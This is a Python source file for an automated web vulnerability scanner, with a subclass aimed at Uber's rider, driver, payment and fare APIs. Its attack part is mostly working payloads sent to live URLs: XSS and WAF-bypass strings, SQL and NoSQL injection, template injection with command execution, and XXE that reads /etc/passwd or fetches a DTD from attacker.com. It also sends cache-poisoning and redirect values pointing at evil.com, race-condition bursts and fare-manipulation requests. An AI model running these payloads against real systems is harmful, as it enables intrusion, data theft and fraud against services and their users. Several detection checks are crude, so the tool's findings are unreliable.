#!/usr/bin/env python3
# Save as: src/enhanced_vuln_detection_v2.py
# Advanced vulnerability detection with modern techniques

import re
import json
import base64
import hashlib
import time
import requests
import urllib.parse
from typing import Dict, List, Optional, Tuple
import logging

logger = logging.getLogger(__name__)

class ModernVulnerabilityDetector:
    """Enhanced vulnerability detection for modern web applications"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        
        # Modern vulnerability patterns
        self.modern_patterns = {
            'graphql': self._test_graphql_vulnerabilities,
            'jwt': self._test_jwt_vulnerabilities,
            'api_key': self._test_api_key_exposure,
            'cors': self._test_cors_misconfiguration,
            'websocket': self._test_websocket_vulnerabilities,
            'cache_poisoning': self._test_cache_poisoning,
            'prototype_pollution': self._test_prototype_pollution,
            'nosql_injection': self._test_nosql_injection,
            'template_injection': self._test_template_injection,
            'xxe': self._test_xxe_advanced,
            'race_condition': self._test_race_conditions,
            'idor_advanced': self._test_advanced_idor,
            'subdomain_takeover': self._test_subdomain_takeover,
            'oauth': self._test_oauth_vulnerabilities,
            'business_logic': self._test_business_logic_flaws
        }
        
        # Enhanced payloads for modern frameworks
        self.modern_xss_payloads = [
            # React/Vue/Angular XSS
            "{{constructor.constructor('alert(1)')()}}",
            "${alert(1)}",
            "<img src=x onerror=alert(1)>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            
            # Bypass modern WAFs
            "<svg><script>alert&lpar;1&rpar;</script>",
            "<img src=x onerror=\u0061lert(1)>",
            "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'>",
            
            # DOM XSS for SPAs
            "#<img src=x onerror=alert(1)>",
            "javascript:alert(1)//",
            "data:text/html,<script>alert(1)</script>",
            
            # Mutation XSS
            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
            
            # Polyglot payload
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>"
        ]
        
        self.modern_sqli_payloads = [
            # Time-based blind for various databases
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",  # MySQL
            "1'; WAITFOR DELAY '00:00:05'--",  # MSSQL
            "1' AND pg_sleep(5)--",  # PostgreSQL
            "1' AND 1=(SELECT 1 FROM PG_SLEEP(5))--",  # PostgreSQL alt
            "1' AND SLEEP(5)--",  # SQLite
            
            # Boolean-based blind
            "1' AND 1=1--",
            "1' AND 1=2--",
            
            # Union-based with WAF bypass
            "1' UnIoN SeLeCt 1,2,3--",
            "1' /*!50000UNION*/ SELECT 1,2,3--",
            "-1' UNION ALL SELECT 1,@@version,3--",
            
            # Second-order SQLi
            "admin'--",
            "admin' or '1'='1",
            
            # JSON-based SQLi
            '{"username":"admin\' or 1=1--","password":"test"}',
            '{"id":"1 UNION SELECT * FROM users--"}'
        ]
    
    def test_modern_vulnerabilities(self, target: str, endpoints: List[Dict]) -> List[Dict]:
        """Test for modern vulnerability types"""
        findings = []
        
        # Test each endpoint with modern techniques
        for endpoint in endpoints:
            url = endpoint.get('url', '')
            
            # Skip if not a valid URL
            if not url or not url.startswith('http'):
                continue
            
            logger.info(f"Testing modern vulnerabilities on: {url}")
            
            # Test each vulnerability type
            for vuln_type, test_func in self.modern_patterns.items():
                try:
                    result = test_func(url, endpoint)
                    if result and result.get('vulnerable'):
                        findings.append(result)
                        logger.info(f"Found {vuln_type} vulnerability at {url}")
                except Exception as e:
                    logger.debug(f"Error testing {vuln_type} on {url}: {e}")
            
            # Add delay to avoid rate limiting
            time.sleep(1)
        
        return findings
    
    def _test_graphql_vulnerabilities(self, url: str, endpoint: Dict) -> Optional[Dict]:
        """Test for GraphQL-specific vulnerabilities"""
        # Check if it's a GraphQL endpoint
        graphql_indicators = ['/graphql', '/gql', '/query', '/v1/graphql', '/api/graphql']
        
        if not any(indicator in url.lower() for indicator in graphql_indicators):
            return None
        
        findings = []
        
        # 1. Introspection query
        introspection_query = {
            "query": """
            {
                __schema {
                    types {
                        name
                        fields {
                            name
                            type {
                                name
                            }
                        }
                    }
                }
            }
            """
        }
        
        try:
            response = self.session.post(url, json=introspection_query, timeout=10)
            if response.status_code == 200 and '__schema' in response.text:
                return {
                    'vulnerable': True,
                    'type': 'GraphQL Introspection Enabled',
                    'url': url,
                    'severity': 'medium',
                    'evidence': 'Full schema exposed via introspection query',
                    'confidence': 'high'
                }
        except:
            pass
        
        # 2. Query depth attack
        deep_query = {
            "query": """
            query {
                user {
                    posts {
                        comments {
                            user {
                                posts {
                                    comments {
                                        user {
                                            id
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            """
        }
        
        try:
            response = self.session.post(url, json=deep_query, timeout=10)
            if response.status_code == 200 and 'data' in response.text:
                return {
                    'vulnerable': True,
                    'type': 'GraphQL Query Depth Limit Bypass',
                    'url': url,
                    'severity': 'medium',
                    'evidence': 'No query depth limit - DoS possible',
                    'confidence': 'medium'
                }
        except:
            pass
        
        # 3. Batch query attack
        batch_queries = [
            {"query": f"query {{ user(id: {i}) {{ id email }} }}"} for i in range(100)
        ]
        
        try:
            response = self.session.post(url, json=batch_queries[:10], timeout=10)
            if response.status_code == 200 and isinstance(response.json(), list):
                return {
                    'vulnerable': True,
                    'type': 'GraphQL Batching Attack',
                    'url': url,
                    'severity': 'medium',
                    'evidence': 'Batching enabled - allows brute force attacks',
                    'confidence': 'high'
                }
        except:
            pass
        
        return None
    
    def _test_jwt_vulnerabilities(self, url: str, endpoint: Dict) -> Optional[Dict]:
        """Test for JWT vulnerabilities in headers and cookies"""
        try:
            response = self.session.get(url, timeout=10)
            
            # Look for JWT in response
            jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
            
            # Check headers
            for header, value in response.headers.items():
                if re.search(jwt_pattern, str(value)):
                    # Analyze JWT
                    return self._analyze_jwt(value, url)
            
            # Check cookies
            for cookie in response.cookies:
                if re.search(jwt_pattern, str(cookie.value)):
                    return self._analyze_jwt(cookie.value, url)
            
            # Check response body
            jwt_match = re.search(jwt_pattern, response.text)
            if jwt_match:
                return self._analyze_jwt(jwt_match.group(0), url)
                
        except:
            pass
        
        return None
    
    def _analyze_jwt(self, token: str, url: str) -> Optional[Dict]:
        """Analyze JWT for vulnerabilities"""
        try:
            # Split token
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            # Decode header
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            
            # Check for none algorithm
            if header.get('alg', '').lower() == 'none':
                return {
                    'vulnerable': True,
                    'type': 'JWT None Algorithm',
                    'url': url,
                    'severity': 'high',
                    'evidence': f'JWT uses "none" algorithm: {token[:50]}...',
                    'confidence': 'high'
                }
            
            # Check for weak algorithms
            weak_algs = ['HS256', 'HS384', 'HS512']
            if header.get('alg') in weak_algs:
                # Try common secrets
                common_secrets = ['secret', 'password', '123456', 'key', 'jwt_secret']
                for secret in common_secrets:
                    try:
                        # Verify with common secret
                        import hmac
                        signature = base64.urlsafe_b64encode(
                            hmac.new(
                                secret.encode(),
                                f"{parts[0]}.{parts[1]}".encode(),
                                hashlib.sha256
                            ).digest()
                        ).decode().rstrip('=')
                        
                        if signature == parts[2]:
                            return {
                                'vulnerable': True,
                                'type': 'JWT Weak Secret',
                                'url': url,
                                'severity': 'high',
                                'evidence': f'JWT uses weak secret: {secret}',
                                'confidence': 'high'
                            }
                    except:
                        pass
            
            # Decode payload
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            
            # Check for sensitive data
            sensitive_fields = ['password', 'ssn', 'credit_card', 'api_key', 'secret']
            for field in sensitive_fields:
                if field in str(payload).lower():
                    return {
                        'vulnerable': True,
                        'type': 'JWT Sensitive Data Exposure',
                        'url': url,
                        'severity': 'medium',
                        'evidence': f'JWT contains potentially sensitive field: {field}',
                        'confidence': 'medium'
                    }
                    
        except:
            pass
        
        return None
    
    def _test_cors_misconfiguration(self, url: str, endpoint: Dict) -> Optional[Dict]:
        """Test for CORS misconfiguration"""
        origins_to_test = [
            'https://evil.com',
            'null',
            'https://evil.uber.com',  # Subdomain for targeted testing
            'https://uber.com.evil.com',  # Suffix matching
            'https://uberevilcom'  # Regex bypass
        ]
        
        for origin in origins_to_test:
            try:
                response = self.session.get(
                    url,
                    headers={'Origin': origin},
                    timeout=10
                )
                
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                acac = response.headers.get('Access-Control-Allow-Credentials', '')
                
                # Check for vulnerable CORS
                if acao == origin or acao == '*':
                    severity = 'high' if acac.lower() == 'true' else 'medium'
                    
                    return {
                        'vulnerable': True,
                        'type': 'CORS Misconfiguration',
                        'url': url,
                        'severity': severity,
                        'evidence': f'Origin {origin} is reflected in ACAO header',
                        'details': {
                            'origin_sent': origin,
                            'acao_header': acao,
                            'credentials': acac
                        },
                        'confidence': 'high'
                    }
                    
            except:
                pass
        
        return None
    
    def _test_cache_poisoning(self, url: str, endpoint: Dict) -> Optional[Dict]:
        """Test for web cache poisoning"""
        # Cache buster
        cache_buster = str(int(time.time()))
        
        # Unkeyed headers to test
        poison_headers = {
            'X-Forwarded-Host': 'evil.com',
            'X-Forwarded-Scheme': 'nothttps',
            'X-Forwarded-Port': '1337',
            'X-Original-URL': '/admin',
            'X-Rewrite-URL': '/admin'
        }
        
        for header, value in poison_headers.items():
            try:
                # First request with poison header
                poison_url = f"{url}?cb={cache_buster}"
                response1 = self.session.get(
                    poison_url,
                    headers={header: value},
                    timeout=10
                )
                
                # Second request without poison header
                response2 = self.session.get(poison_url, timeout=10)
                
                # Check if poison was cached
                if value in response2.text or value in str(response2.headers):
                    return {
                        'vulnerable': True,
                        'type': 'Web Cache Poisoning',
                        'url': url,
                        'severity': 'high',
                        'evidence': f'Unkeyed header {header} poisoned the cache',
                        'details': {
                            'header': header,
                            'value': value,
                            'cache_key': poison_url
                        },
                        'confidence': 'high'
                    }
                    
            except:
                pass
        
        return None
    
    def _test_prototype_pollution(self, url: str, endpoint: Dict) -> Optional[Dict]:
        """Test for client-side prototype pollution"""
        # This would require JavaScript analysis
        # For now, test for vulnerable parameters
        
        pollution_payloads = [
            '__proto__[polluted]=true',
            '__proto__.polluted=true',
            'constructor[prototype][polluted]=true',
            'constructor.prototype.polluted=true'
        ]
        
        for payload in pollution_payloads:
            try:
                test_url = f"{url}?{payload}"
                response = self.session.get(test_url, timeout=10)
                
                # Look for pollution indicators in response
                if 'polluted' in response.text:
                    return {
                        'vulnerable': True,
                        'type': 'Prototype Pollution',
                        'url': url,
                        'severity': 'medium',
                        'evidence': f'Prototype pollution via {payload}',
                        'confidence': 'medium'
                    }
                    
            except:
                pass
        
        return None
    
    def _test_nosql_injection(self, url: str, endpoint: Dict) -> Optional[Dict]:
        """Test for NoSQL injection"""
        nosql_payloads = [
            # MongoDB
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "this.password.match(/.*/)"},
            
            # Array injection
            {"username": ["admin"], "password": {"$ne": None}},
            
            # JavaScript injection
            {"$where": "sleep(5000)"},
            
            # JSON injection
            '{"username": {"$ne": null}, "password": {"$ne": null}}'
        ]
        
        for payload in nosql_payloads:
            try:
                # Test both GET and POST
                if isinstance(payload, dict):
                    # POST request
                    response = self.session.post(
                        url,
                        json=payload,
                        timeout=10
                    )
                else:
                    # GET request
                    response = self.session.get(
                        f"{url}?filter={urllib.parse.quote(payload)}",
                        timeout=10
                    )
                
                # Check for authentication bypass indicators
                if response.status_code == 200:
                    auth_indicators = ['dashboard', 'welcome', 'logout', 'profile']
                    if any(indicator in response.text.lower() for indicator in auth_indicators):
                        return {
                            'vulnerable': True,
                            'type': 'NoSQL Injection',
                            'url': url,
                            'severity': 'high',
                            'evidence': 'Authentication bypass via NoSQL injection',
                            'payload': str(payload),
                            'confidence': 'medium'
                        }
                        
            except:
                pass
        
        return None
    
    def _test_template_injection(self, url: str, endpoint: Dict) -> Optional[Dict]:
        """Test for server-side template injection"""
        # Template injection payloads for various engines
        template_payloads = [
            # Generic
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("<%= 7*7 %>", "49"),
            
            # Jinja2
            ("{{config}}", "Config"),
            ("{{self._TemplateReference__context}}", "Context"),
            
            # Twig
            ("{{_self.env.registerUndefinedFilterCallback('exec')}}", "exec"),
            
            # Freemarker
            ("${7*'7'}", "7777777"),
            
            # Velocity
            ("#set($x=7*7)$x", "49"),
            
            # Smarty
            ("{php}echo `id`;{/php}", "uid="),
            
            # Expression Language
            ("${applicationScope}}", "javax.servlet"),
            
            # Pug
            ("#{7*7}", "49")
        ]
        
        for payload, expected in template_payloads:
            try:
                # Test in various parameters
                test_params = ['name', 'search', 'q', 'template', 'page', 'view']
                
                for param in test_params:
                    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=10)
                    
                    if expected in response.text:
                        return {
                            'vulnerable': True,
                            'type': 'Server-Side Template Injection',
                            'url': url,
                            'parameter': param,
                            'severity': 'critical',
                            'evidence': f'Template expression evaluated: {payload} = {expected}',
                            'confidence': 'high'
                        }
                        
            except:
                pass
        
        return None
    
    def _test_xxe_advanced(self, url: str, endpoint: Dict) -> Optional[Dict]:
        """Advanced XXE testing"""
        # Advanced XXE payloads
        xxe_payloads = [
            # Standard XXE
            '''<?xml version="1.0"?>
            <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <root>&xxe;</root>''',
            
            # Blind XXE with external DTD
            '''<?xml version="1.0"?>
            <!DOCTYPE foo [
            <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
            %xxe;]>
            <root>test</root>''',
            
            # XXE via parameter entities
            '''<?xml version="1.0"?>
            <!DOCTYPE foo [
            <!ENTITY % file SYSTEM "file:///etc/passwd">
            <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
            %eval;
            %error;]>
            <root>test</root>''',
            
            # XXE in SOAP
            '''<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <test>&xxe;</test>
            </soap:Body>
            </soap:Envelope>''',
            
            # XXE in SVG
            '''<svg xmlns="http://www.w3.org/2000/svg">
            <!DOCTYPE svg [
            <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <text>&xxe;</text>
            </svg>'''
        ]
        
        # Different content types to test
        content_types = [
            'application/xml',
            'text/xml',
            'application/soap+xml',
            'application/xhtml+xml',
            'application/xml-dtd',
            'image/svg+xml'
        ]
        
        for ct in content_types:
            for payload in xxe_payloads:
                try:
                    response = self.session.post(
                        url,
                        data=payload,
                        headers={'Content-Type': ct},
                        timeout=10
                    )
                    
                    # Check for XXE indicators
                    xxe_indicators = ['root:x:', 'daemon:', 'bin:', 'nobody:', '/etc/passwd']
                    
                    for indicator in xxe_indicators:
                        if indicator in response.text:
                            return {
                                'vulnerable': True,
                                'type': 'XML External Entity (XXE)',
                                'url': url,
                                'severity': 'high',
                                'evidence': f'XXE successful with {ct}',
                                'content_type': ct,
                                'confidence': 'high'
                            }
                            
                except:
                    pass
        
        return None
    
    def _test_race_conditions(self, url: str, endpoint: Dict) -> Optional[Dict]:
        """Test for race condition vulnerabilities"""
        # This is simplified - real race condition testing needs proper tooling
        
        # Look for endpoints that might have race conditions
        race_prone_endpoints = ['transfer', 'withdraw', 'purchase', 'vote', 'like', 'redeem']
        
        if not any(ep in url.lower() for ep in race_prone_endpoints):
            return None
        
        # Test with parallel requests
        import concurrent.futures
        import threading
        
        results = []
        lock = threading.Lock()
        
        def make_request():
            try:
                response = self.session.post(url, json={"amount": 1}, timeout=5)
                with lock:
                    results.append(response.status_code)
            except:
                pass
        
        # Send 10 parallel requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(make_request) for _ in range(10)]
            concurrent.futures.wait(futures, timeout=10)
        
        # Check if multiple succeeded (potential race condition)
        success_count = results.count(200)
        if success_count > 1:
            return {
                'vulnerable': True,
                'type': 'Race Condition',
                'url': url,
                'severity': 'high',
                'evidence': f'{success_count} parallel requests succeeded',
                'confidence': 'medium'
            }
        
        return None
    
    def _test_advanced_idor(self, url: str, endpoint: Dict) -> Optional[Dict]:
        """Advanced IDOR testing with UUID and hash prediction"""
        import uuid
        import hashlib
        
        # Extract IDs from URL
        id_patterns = [
            (r'/([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})', 'uuid'),
            (r'/([a-f0-9]{32})', 'md5'),
            (r'/([a-f0-9]{40})', 'sha1'),
            (r'/([a-f0-9]{64})', 'sha256'),
            (r'/(\d{1,10})', 'numeric')
        ]
        
        for pattern, id_type in id_patterns:
            match = re.search(pattern, url)
            if match:
                original_id = match.group(1)
                
                # Generate test IDs based on type
                test_ids = []
                
                if id_type == 'uuid':
                    # Try sequential UUIDs
                    try:
                        base_uuid = uuid.UUID(original_id)
                        for i in range(-5, 6):
                            if i != 0:
                                new_uuid = uuid.UUID(int=base_uuid.int + i)
                                test_ids.append(str(new_uuid))
                    except:
                        pass
                        
                elif id_type == 'numeric':
                    # Numeric progression
                    try:
                        base_num = int(original_id)
                        test_ids.extend([str(base_num + i) for i in range(-10, 11) if i != 0])
                    except:
                        pass
                        
                elif id_type in ['md5', 'sha1', 'sha256']:
                    # Try common patterns
                    common_bases = ['user1', 'user2', 'admin', 'test', '1', '2', '3']
                    for base in common_bases:
                        if id_type == 'md5':
                            test_ids.append(hashlib.md5(base.encode()).hexdigest())
                        elif id_type == 'sha1':
                            test_ids.append(hashlib.sha1(base.encode()).hexdigest())
                        elif id_type == 'sha256':
                            test_ids.append(hashlib.sha256(base.encode()).hexdigest())
                
                # Test each ID
                for test_id in test_ids[:10]:  # Limit to prevent abuse
                    test_url = url.replace(original_id, test_id)
                    
                    try:
                        response = self.session.get(test_url, timeout=10)
                        
                        if response.status_code == 200:
                            # Additional validation - check for actual data
                            data_indicators = ['email', 'username', 'id', 'data', 'profile']
                            if any(indicator in response.text.lower() for indicator in data_indicators):
                                return {
                                    'vulnerable': True,
                                    'type': 'Insecure Direct Object Reference (IDOR)',
                                    'url': test_url,
                                    'severity': 'high',
                                    'evidence': f'Accessed different object: {test_id}',
                                    'original_id': original_id,
                                    'accessed_id': test_id,
                                    'id_type': id_type,
                                    'confidence': 'high'
                                }
                    except:
                        pass
        
        return None
    
    def _test_subdomain_takeover(self, url: str, endpoint: Dict) -> Optional[Dict]:
        """Test for subdomain takeover vulnerabilities"""
        # This would typically be done at the subdomain discovery phase
        # Checking CNAME records for vulnerable services
        
        vulnerable_cnames = {
            'amazonaws.com': 'NoSuchBucket',
            'azurewebsites.net': 'Azure Web App - Error 404',
            'github.io': "There isn't a GitHub Pages site here",
            'shopify.com': 'Sorry, this shop is currently unavailable',
            'tumblr.com': "There's nothing here.",
            'wpengine.com': 'The site you were looking for couldn\'t be found',
            'ghost.io': 'The thing you were looking for is no longer here',
            'surge.sh': 'project not found',
            'bitbucket.org': 'The page you have requested does not exist'
        }
        
        # Check if current endpoint shows takeover signs
        try:
            response = self.session.get(url, timeout=10)
            
            for service, fingerprint in vulnerable_cnames.items():
                if fingerprint in response.text:
                    return {
                        'vulnerable': True,
                        'type': 'Subdomain Takeover',
                        'url': url,
                        'severity': 'high',
                        'evidence': f'Subdomain points to unclaimed {service}',
                        'service': service,
                        'confidence': 'high'
                    }
        except:
            pass
        
        return None
    
    def _test_oauth_vulnerabilities(self, url: str, endpoint: Dict) -> Optional[Dict]:
        """Test for OAuth misconfigurations"""
        oauth_endpoints = ['/oauth', '/authorize', '/callback', '/token', '/auth']
        
        if not any(ep in url.lower() for ep in oauth_endpoints):
            return None
        
        # Test for open redirect in OAuth
        redirect_payloads = [
            'https://evil.com',
            '//evil.com',
            'https://trusted.com@evil.com',
            'https://trusted.com.evil.com',
            'https://evil.com#trusted.com',
            'https://evil.com?trusted.com'
        ]
        
        for payload in redirect_payloads:
            try:
                test_url = f"{url}?redirect_uri={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, allow_redirects=False, timeout=10)
                
                location = response.headers.get('Location', '')
                if payload in location or 'evil.com' in location:
                    return {
                        'vulnerable': True,
                        'type': 'OAuth Open Redirect',
                        'url': url,
                        'severity': 'medium',
                        'evidence': f'Redirect to {payload} allowed',
                        'confidence': 'high'
                    }
            except:
                pass
        
        # Test for authorization code reuse
        # Test for implicit grant type
        # Test for CSRF in OAuth flow
        
        return None
    
    def _test_websocket_vulnerabilities(self, url: str, endpoint: Dict) -> Optional[Dict]:
        """Test for WebSocket vulnerabilities"""
        # Convert HTTP to WS URL
        ws_url = url.replace('https://', 'wss://').replace('http://', 'ws://')
        
        # Only test if it looks like a WebSocket endpoint
        ws_indicators = ['/ws', '/websocket', '/socket.io', '/cable', '/hub']
        if not any(indicator in url.lower() for indicator in ws_indicators):
            return None
        
        try:
            import websocket
            
            # Test for missing origin validation
            ws = websocket.create_connection(
                ws_url,
                header=["Origin: https://evil.com"],
                timeout=5
            )
            
            # If connection successful with evil origin, it's vulnerable
            ws.close()
            
            return {
                'vulnerable': True,
                'type': 'WebSocket Origin Validation Bypass',
                'url': ws_url,
                'severity': 'medium',
                'evidence': 'WebSocket accepts connections from any origin',
                'confidence': 'high'
            }
            
        except:
            pass
        
        return None
    
    def _test_business_logic_flaws(self, url: str, endpoint: Dict) -> Optional[Dict]:
        """Test for business logic vulnerabilities"""
        # This is highly application-specific
        # Testing for common patterns
        
        # Price manipulation
        if 'price' in url.lower() or 'amount' in url.lower():
            try:
                # Test negative values
                response = self.session.post(
                    url,
                    json={"amount": -100, "quantity": -1},
                    timeout=10
                )
                
                if response.status_code == 200:
                    return {
                        'vulnerable': True,
                        'type': 'Business Logic Flaw - Negative Value Accepted',
                        'url': url,
                        'severity': 'high',
                        'evidence': 'Application accepts negative values for amount/quantity',
                        'confidence': 'medium'
                    }
            except:
                pass
        
        # Integer overflow
        if 'quantity' in url.lower() or 'count' in url.lower():
            try:
                # Test large values
                response = self.session.post(
                    url,
                    json={"quantity": 2147483648},  # Integer overflow value
                    timeout=10
                )
                
                if response.status_code == 200 and 'error' not in response.text.lower():
                    return {
                        'vulnerable': True,
                        'type': 'Business Logic Flaw - Integer Overflow',
                        'url': url,
                        'severity': 'medium',
                        'evidence': 'Application accepts values that may cause integer overflow',
                        'confidence': 'low'
                    }
            except:
                pass
        
        return None
    
    def _test_api_key_exposure(self, url: str, endpoint: Dict) -> Optional[Dict]:
        """Test for API key exposure in URL, response body, or headers (Uber, X, Coinbase, etc.)"""
        api_key_patterns = [
            r'AIza[0-9A-Za-z-_]{35}',                # Google API Key
            r'AKIA[0-9A-Z]{16}',                     # AWS Access Key ID
            r'sk_live_[0-9a-zA-Z]{24,}',             # Stripe Live Secret Key
            r'pk_live_[0-9a-zA-Z]{24,}',             # Stripe Live Publishable Key
            r'coinbase[a-zA-Z0-9]{32,}',             # Coinbase API Key (generic)
            r'(?i)cb-[a-z0-9]{32,}',                 # Coinbase API Key (starts with cb-)
            r'(?i)x-api-key[\'"\s:=]+[a-z0-9]{16,}', # X/Twitter/Coinbase generic
            r'(?i)api[_-]?key[\'"\s:=]+[a-z0-9]{16,}', # api_key=...
            r'(?i)uber[_-]?token[\'"\s:=]+[a-z0-9]{16,}', # Uber token
            r'(?i)access[_-]?token[\'"\s:=]+[a-z0-9]{16,}', # access_token=...
            r'(?i)bearer[\'"\s:=]+[a-z0-9\-_\.]{20,}', # Bearer tokens
        ]
        try:
            response = self.session.get(url, timeout=10)
            # Check in URL
            for pattern in api_key_patterns:
                if re.search(pattern, url):
                    return {
                        'vulnerable': True,
                        'type': 'API Key Exposure in URL',
                        'url': url,
                        'severity': 'high',
                        'evidence': f'API key pattern found in URL: {pattern}',
                        'confidence': 'high'
                    }
            # Check in response body
            for pattern in api_key_patterns:
                match = re.search(pattern, response.text)
                if match:
                    return {
                        'vulnerable': True,
                        'type': 'API Key Exposure in Response',
                        'url': url,
                        'severity': 'high',
                        'evidence': f'API key found: {match.group(0)}',
                        'confidence': 'high'
                    }
            # Check in headers
            for header, value in response.headers.items():
                for pattern in api_key_patterns:
                    if re.search(pattern, str(value)):
                        return {
                            'vulnerable': True,
                            'type': 'API Key Exposure in Header',
                            'url': url,
                            'severity': 'high',
                            'evidence': f'API key pattern found in header {header}',
                            'confidence': 'high'
                        }
        except Exception as e:
            logger.debug(f"API key exposure test failed for {url}: {e}")
        return None


# Uber-specific vulnerability patterns
class UberSpecificDetector(ModernVulnerabilityDetector):
    """Uber-specific vulnerability detection patterns"""
    
    def __init__(self):
        super().__init__()
        
        # Uber-specific endpoints
        self.uber_endpoints = {
            'riders': ['/api/getRider', '/api/riders/', '/riders/api/'],
            'drivers': ['/api/getDriver', '/api/drivers/', '/drivers/api/'],
            'payments': ['/api/getPaymentMethods', '/api/payments/', '/payment/api/'],
            'trips': ['/api/getTrips', '/api/trips/', '/trips/history'],
            'fare': ['/api/getFare', '/api/estimateFare', '/fare/estimate'],
            'promo': ['/api/getPromos', '/api/applyPromo', '/promo/apply'],
            'internal': ['/internal/', '/admin/', '/debug/', '/cfe/']
        }
        
        # Uber-specific parameters
        self.uber_params = {
            'user_ids': ['rider_id', 'driver_id', 'user_uuid', 'uuid'],
            'trip_ids': ['trip_id', 'trip_uuid', 'ride_id'],
            'payment_ids': ['payment_id', 'payment_method_uuid', 'card_id'],
            'promo_codes': ['promo_code', 'referral_code', 'coupon_code']
        }
    
    def test_uber_specific(self, url: str, endpoint: Dict) -> Optional[Dict]:
        """Test for Uber-specific vulnerabilities"""
        findings = []
        
        # Test for exposed internal APIs
        for category, paths in self.uber_endpoints.items():
            for path in paths:
                test_url = url.replace(endpoint.get('path', ''), path)
                try:
                    response = self.session.get(test_url, timeout=10)
                    if response.status_code == 200:
                        findings.append({
                            'vulnerable': True,
                            'type': f'Exposed Uber {category.title()} API',
                            'url': test_url,
                            'severity': 'high',
                            'evidence': f'Internal {category} API accessible',
                            'confidence': 'high'
                        })
                except:
                    pass
        
        # Test for UUID enumeration
        uuid_pattern = r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}'
        if re.search(uuid_pattern, url):
            # Test with Uber-specific UUID patterns
            test_uuids = [
                '00000000-0000-0000-0000-000000000000',  # Null UUID
                'ffffffff-ffff-ffff-ffff-ffffffffffff',  # Max UUID
            ]
            
            for test_uuid in test_uuids:
                test_url = re.sub(uuid_pattern, test_uuid, url)
                try:
                    response = self.session.get(test_url, timeout=10)
                    if response.status_code == 200:
                        findings.append({
                            'vulnerable': True,
                            'type': 'Uber UUID Enumeration',
                            'url': test_url,
                            'severity': 'high',
                            'evidence': f'Access to UUID {test_uuid}',
                            'confidence': 'high'
                        })
                except:
                    pass
        
        # Test for fare manipulation
        if 'fare' in url.lower() or 'price' in url.lower():
            fare_payloads = [
                {"surge_multiplier": 0},
                {"base_fare": -100},
                {"promo_code": "ADMIN"},
                {"fare_override": True}
            ]
            
            for payload in fare_payloads:
                try:
                    response = self.session.post(url, json=payload, timeout=10)
                    if response.status_code == 200:
                        findings.append({
                            'vulnerable': True,
                            'type': 'Uber Fare Manipulation',
                            'url': url,
                            'severity': 'critical',
                            'evidence': f'Fare manipulation with {payload}',
                            'confidence': 'medium'
                        })
                except:
                    pass
        
        return findings[0] if findings else None
